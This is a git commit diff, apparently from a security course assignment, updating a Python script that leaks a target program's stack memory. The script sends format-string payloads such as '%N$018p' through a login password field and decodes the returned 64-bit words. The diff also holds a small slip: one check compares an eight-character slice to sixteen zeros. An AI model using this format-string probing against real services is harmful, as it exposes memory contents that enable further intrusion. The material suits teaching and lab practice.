b566233cb39f3c123221405568dc0820d6693350
Suraj Rathi <suraj.rathi00@gmail.com>
2023-03-05 15:03:53 +0530

    done

--- a3/p1/stack_dump.py
+++ a3/p1/stack_dump.py
@@ -17,20 +17,22 @@ def readable_decode(inp: Union[bytes, Iterable[int]]) -> str:
 
 
 def main():
-    words_to_check = 1024 * 2
-    num_inner = 8  # 64
+    words_to_check = 256  # 1024 * 2
+    num_inner = 4  # 64
     # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
 
     for i in tqdm.trange(1, words_to_check + 1):
         u = set()
         for j in range(num_inner):
-            u.add(connect(username=b"surajishi", password=b"%%%i$08x" % i).decode('ASCII'.replace(' ', '0')))
+            u.add(connect(username=b"surajishi", password=b"%%%i$018p" % i).decode('ASCII'.replace(' ', '0'))[2:])
+        if '           (nil)' in u:
+            u.remove('           (nil)')
         if '' in u:
             u.remove('')
         if len(u) == 1:
             v = tuple(u)[0]
-            str_bytes = (v[:2], v[2:4], v[4:6], v[6:8])[::-1]
-            if v[:8] == "00000000":
+            str_bytes = (v[:2], v[2:4], v[4:6], v[6:8], v[8:10], v[10:12], v[12:14], v[14:16])[::-1]
+            if v[:8] == "0000000000000000":
                 continue
             byte_bytes = [int(s, 16) for s in str_bytes]
             tqdm.tqdm.write(f"{i:4}:  {v}  {readable_decode(byte_bytes)}")
